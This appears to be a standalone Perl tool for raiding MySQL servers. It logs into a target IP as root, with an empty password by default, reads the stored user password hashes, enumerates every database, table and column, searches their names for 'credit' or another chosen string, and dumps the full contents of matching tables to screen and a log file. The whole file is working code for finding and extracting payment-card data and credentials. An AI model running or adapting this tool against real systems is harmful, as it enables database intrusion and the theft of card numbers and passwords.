#!/usr/bin/perl
$| = 1;

use DBI;

# Verbose
$DEBUG			= "F";

$user			= "root";	# Change $user by -u <USER>
$password		= "";		# Maybe the password might not be set
$str			= "credit";	# Search for Credit Card by default

# Set Arguments from command line
&set_args;

# Log File Suffix
($tmp_str = $str)	=~ s/\s+|\|/_/g;

chomp($dir		= `pwd`);
$logfile		= "$dir/mysql_hkd.txt_$tmp_str";

# Open Database
&openDB;

# Open Log File
open(LOG,">$logfile");

# Basic Test Query
&test_query;

# Grab All Databases
&get_databases;

# Grab All Database Tables
&get_tables;

# Describe All Database Table Fields
&desc_tables;

# Display Sensitive Tables && Contents
&display_sensitive_tables;

# Close Log File
close(LOG);

# Close Database
&closeDB;

sub print_log
{
	chomp(my $tmp = $_[0]);

	# Print to Log File
	print LOG "$tmp\n";

	# Print to Screen
	print "$tmp\n";
}

sub display_sensitive_tables
{
	# If a Search String contains something
	if($str ne "")
	{
		# If possible sensitive database tables columns where found
		if($#NUGGETS > -1)
		{
			&print_log("");
			&print_log("######################################################");
			&print_log("Display Sensitive Tables");
			&print_log("------------------------------------------------------");

			foreach my $line (@NUGGETS)
			{
				chomp($line);
				my($database,$table,$field) = split(/\|/,$line);

				&print_log("[String]: $str | [Found In]: [Database]:$database, [Table]:$table, [Field]:$field");

			}
			&print_log("######################################################");

			# Since sensitive fields where found,
			# then  let's display the sensitive content
			&display_sensitive_contents;

		}
	}
}

sub display_sensitive_contents
{

	# Display Sensitive Contents of each database table that was found

	foreach my $KEY (sort keys %COUNT)
	{
		chomp($KEY);

		my($database,$table) = split(/\|/,$KEY);
	
		my $query = "select * from $database.$table";

		&print_log("\n");
		&print_log("######################################################");
		&print_log("Display Sensitive Contents");
		&print_log("[Database]: $database, [Table]: $table");
		&print_log("[query]: $query");
		&print_log("------------------------------------------------------");


        	my $sth         = $dbh->prepare("$query") or die "Prepare failed ($DBI::err):".DBI->errstr;
        	$sth->execute();
        	my $rowcnt     = $sth->rows();

        	if($rowcnt > 0)
        	{
			# print column (ie fields)
			print join (',', @{$sth->{NAME}}), "\n";
			print LOG join (',', @{$sth->{NAME}}), "\n";

			# print remaining rows 
			while (my @row = $sth->fetchrow_array()) 
			{
   				print join(',', @row), "\n";
   				print LOG join(',', @row), "\n";
			}
                }
		else
		{
			&print_log("0 records found");
		}
		&print_log("######################################################");

	}
}

sub test_query
{
	# Display Database Host, Username, and their Password

	$query = "select Host,User,Password from user";

	my $sth         = $dbh->prepare("$query") or die "Prepare failed ($DBI::err):".DBI->errstr;
        $sth->execute();
        my $rowcnt     = $sth->rows();

        if($rowcnt > 0)
	{
                while(my $hashref = $sth->fetchrow_hashref())
		{
                	my $host      		= &trimIT($$hashref{'Host'});
                	my $user      		= &trimIT($$hashref{'User'});
                	my $password      	= &trimIT($$hashref{'Password'});

			&print_debug("$host|$user|$password");
		}
	}
}

sub desc_tables
{
	# Describe Each Database Table

	foreach my $line (@TABLES)
	{
		chomp($line);
		my($database,$table) = split(/\|/,$line);
		
		$query = "desc $database.$table";

		my $sth         = $dbh->prepare("$query") or die "Prepare failed ($DBI::err):".DBI->errstr;
                $sth->execute();
                my $rowcnt     = $sth->rows();

		if($rowcnt > 0)
                {

                        while(my $hashref = $sth->fetchrow_hashref())
                        {
                                my $field               = &trimIT($$hashref{'Field'});

                                &print_debug("[Field]: $database|$table|$field");

                                push(@FIELDS,"$database|$table|$field");

				# The Default $str is 'credit'	
				if($str ne "")
				{
					# Search Database, Table and Field names for the search string
					if(($database =~ m/$str/i)||($table =~ m/$str/i)||($field =~ m/$str/i))
					{
						push(@NUGGETS,"$database|$table|$field");

						# Store in hash to avoid duplicates
						my $KEY = "$database|$table";
                                		$COUNT{"$KEY"} = $COUNT{"$KEY"} + 1;
					}
				}
                        }
                }
	}
}

sub get_tables
{
	# Display all Database Tables

	foreach my $database (@DATABASES)
	{
		chomp($database);

		$dbh->do("use $database");

		&print_debug("Use Database: $database");

		$query = "show tables";

		my $sth         = $dbh->prepare("$query") or die "Prepare failed ($DBI::err):".DBI->errstr;
        	$sth->execute();
        	my $rowcnt     = $sth->rows();

        	if($rowcnt > 0)
		{

			my $COLUMN = "Tables_in_$database";
			&print_debug("COLUMN: $COLUMN");

                	while(my $hashref = $sth->fetchrow_hashref())
			{
                		my $table   		= &trimIT($$hashref{$COLUMN});

				&print_debug("[Table]: $table");

				push(@TABLES,"$database|$table");
			}
		}
	}
}


sub get_databases
{
	# Display Database Tables

	$query = "show databases";

	my $sth         = $dbh->prepare("$query") or die "Prepare failed ($DBI::err):".DBI->errstr;
        $sth->execute();
        my $rowcnt     = $sth->rows();

        if($rowcnt > 0)
	{
                while(my $hashref = $sth->fetchrow_hashref())
		{
                	my $database   		= &trimIT($$hashref{'Database'});

			&print_debug("[Database]: $database");

			if($database ne "information_schema")
			{
				push(@DATABASES,"$database");
			}
		}
	}
}

sub print_debug
{
	# Verbose Display and Logging

	chomp(my $tmp = $_[0]);

	if($DEBUG eq "T")
	{
		print "$tmp\n";
		print LOG "$tmp\n";
	}
}

sub openDB
{
	# Open Database Connection
	# Check to see if our authentication works for database=mysql
        $dbh = DBI->connect("DBI:mysql:mysql;host=$ip", "$user","$password") or DBI->errstr;

	my $ERROR = DBI->errstr;

	if($ERROR ne "")
	{
		print "ERROR: $ERROR\n";
		
		&print_help($ERROR);
	}
}

sub print_help
{
	chomp(my $msg = $_[0]);

	print "\n";
	print "---------------------------------------------------------------\n";

	print "$0 -V -ip <IP> -u <user> -pw <password> -s <search string>\n";
	print "Required: -ip <IP>\n";
	print "Required: -pw <password>\n";
	print "Optional: -V | This is verbose display and logging\n";
	print "Optional: -u <user> | Note: Default user is 'root'\n";
	print "Optional: -s <search string> | Default is 'credit' E.g., -s 'password'\n";
	
	if($msg ne "")
	{
		print "---------------------------------------------------------------\n";
		print "[Message]: $msg\n";
	}
	exit;
}
	

sub closeDB
{
        #$sth->finish;
        $dbh->disconnect;
}

sub trimIT
{
        chomp(my $tmp  = $_[0]);
        $tmp            =~ s/^\s+//g;
        $tmp            =~ s/\s+$//g;
        #$tmp           =~ s/'/\\'/g;

        if($tmp eq "")
        {
                $tmp = "NA";
        }

        return $tmp;
}

sub set_args
{
	# If Arguments are supplied
	if($#ARGV > -1)
	{
		for(my $i = 0; $i < $#ARGV; $i++)
		{
			chomp(my $arg = $ARGV[$i]);

			if($arg eq "-u")
			{
				# Increment Counter
				$i++;

				# Remove EOL and Assign $user variable
				chomp($user = $ARGV[$i]);
				
				# Display $user is set	
				&print_debug("-u $user");
			}
			elsif($arg eq "-pw")
			{
				# Increment Counter
				$i++;

				# Remove EOL and Assign $password variable
				chomp($password = $ARGV[$i]);

				# Display $password is set	
				&print_debug("-pw $password");
			}
			elsif($arg eq "-ip")
			{
				# Increment Counter
				$i++;

				# Remove EOL and Assign $ip variable
				chomp($ip = $ARGV[$i]);

				# Display $ip is set	
				&print_debug("-ip $ip");
			}
			elsif($arg eq "-s")
			{
				# Increment Counter
				$i++;

				# Remove EOL and Assign $str variable
				chomp($str = $ARGV[$i]);

				# Display $ip is set	
				&print_debug("-s $str");
			}
			elsif($arg eq "-V")
			{
				$DEBUG = "T";
			}
			else
			{
				# Display Help
				&print_help("[Illegal Argument]: $arg");
				
			}
		}
	}
	else
	{
		# Display Help
		&print_help;
	
	}

	if($ip !~ m/\d+.\d+.\d+.\d+/)
	{
		# Display Help
		&print_help("[Required]: -ip <IP>");
	}
}
